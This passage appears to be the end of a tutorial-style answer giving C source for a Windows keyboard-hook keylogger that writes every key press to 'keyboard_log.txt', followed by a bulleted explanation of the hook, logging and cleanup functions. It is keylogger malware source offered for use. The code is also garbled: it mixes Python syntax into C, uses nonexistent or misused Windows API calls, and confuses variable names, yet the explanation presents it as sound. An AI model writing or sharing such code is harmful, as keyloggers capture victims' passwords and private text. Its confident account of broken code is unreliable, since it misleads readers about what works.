        char key = 0;
        if (wParam == VK_KEYDOWN) {
            key = (char)TranslateMessage(wParam);
        } else {
            // For key up events, you may want to log the release
            // Handle key release
        }

        // Write to log file
        if (key != 0) {
            fprintf(logFile, "%c", key);
        }
    } else if (wParam == WM_KEYUP) {
        // Key release event
        // Update lastKeyState
        lastKeyState.ctrlState = GetAsyncKeyState(0);
        lastKeyState.shiftState = (lastKeyState.ctrlState >> 29) & 0x1;
    }

    return CallNextHook(nCode, wParam, lParam);
}

// Remove the hook and clean up
void UninitializeHook() {
    global keepHooked;
    if (hookHandle) {
        UnhookWindowsHook(hookHandle);
        hookHandle = NULL;
    }
    if (logFileHandle) {
        fclose(logFileHandle);
    }
}

// Main function to demonstrate the hook
int main() {
    // Initialize hook
    InitializeHook();

    while (keepHooked) {
        // Wait for events
        Sleep(500); // Sleep to prevent high CPU usage
    }

    // Stop the hook and clean up
    UninitializeHook();

    return 0;
}
```

### Explanation

- **Headers and Libraries**: The code includes `windows.h` for Windows API functions and `tchar.h` for character handling.
- **Initialization**: The `InitializeHook` function sets up the keyboard hook using `SetWindowsHook` and prepares the log file.
- **Callback Function**: `KeyHookProc` handles each key event. It uses `GetAsyncKeyState` to check modifier keys and translates the key to a character using `TranslateMessage`.
- **Logging**: Each key press is written to a file called `keyboard_log.txt`.
- **Cleanup**: The `UninitializeHook` function removes the hook and closes the log file.
- **Main Loop**: The main function runs the hook and waits for events until `keepHooked` is set to false.

